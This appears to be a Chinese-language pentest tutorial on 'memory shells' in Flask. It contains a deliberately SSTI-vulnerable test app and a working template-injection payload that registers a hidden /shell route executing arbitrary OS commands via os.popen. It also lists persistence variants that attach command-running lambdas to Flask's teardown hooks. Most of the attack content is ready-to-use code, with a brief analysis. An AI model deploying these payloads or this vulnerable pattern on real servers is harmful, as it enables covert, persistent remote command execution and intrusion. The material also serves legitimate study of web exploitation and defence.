## 测试环境
app.py
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def home():
    person = 'guest'
    if request.args.get('name'):
        person = request.args.get('name')
    template = '<h2>Hello %s!</h2>' % person
    return render_template_string(template)


if __name__ == "__main__":
    app.run(debug=False)
```
## 低版本Flask内存马
### payload
```PYTHON
{{url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})}}
```
#### payload分析
实质上的payload执行内容
```PYTHON
"
app.add_url_rule(
'/shell',
'shell',
lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read()
)
",
{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']
}
```
从实质的payload执行内容可以明显看出内存马的核心是add_url_rule
#### add_url__rule的源码实现
```PYTHON
def add_url_rule(
	self,
	rule: str,
	endpoint: t.Optional[str] = None,
	view_func: t.Optional[ft.RouteCallable] = None,
	provide_automatic_options: t.Optional[bool] = None,
	**options: t.Any,
) -> None:
```

@before_first_request
在对应用程序实例的第一个请求之前注册要运行的函数,只会运行一次
@teardown_request
注册在每一个请求的末尾,不管是否有异常,每次请求的最后都会执行
```python
app.teardown_request_funcs.setdefault(None, []).append(lambda :__import__('os').popen("calc").read())
```
@teardown_appcontext
```PYTHON
app.teardown_appcontext_funcs.append(lambda x :__import__('os').popen("calc").read())
```
@context_processor
上下文处理器,返回的字典可以在全部的模板中使用.
@template_filter('upper')
增加模板过滤器,可以在模板中使用该函数,后面的参数是名称,在模板中用到.
@errorhandler(400)
发生一些异常时,比如404,500,或者抛出异常(Exception)之类的,就会自动调用该钩子函数.